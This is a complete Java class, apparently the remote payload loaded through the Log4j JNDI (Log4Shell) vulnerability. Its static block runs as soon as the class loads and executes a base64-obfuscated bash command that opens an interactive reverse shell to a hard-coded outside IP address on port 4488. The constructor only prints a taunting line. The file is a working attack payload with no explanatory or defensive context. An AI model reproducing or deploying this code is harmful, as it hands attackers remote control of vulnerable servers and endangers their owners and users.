public class Log4jRCE {

    static {
        
        try {
            java.lang.Runtime.getRuntime().exec("bash -c '{echo,YmFzaCAtYyAiYmFzaCAtaSA+Ji9kZXYvdGNwLzUxLjkxLjExOS4xNzAvNDQ4OCAwPiYxIgo=}|{base64,-d}|{bash,-i}'").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Log4jRCE(){
        System.out.println("I am Log4jRCE from remote222!!!");
    }
}
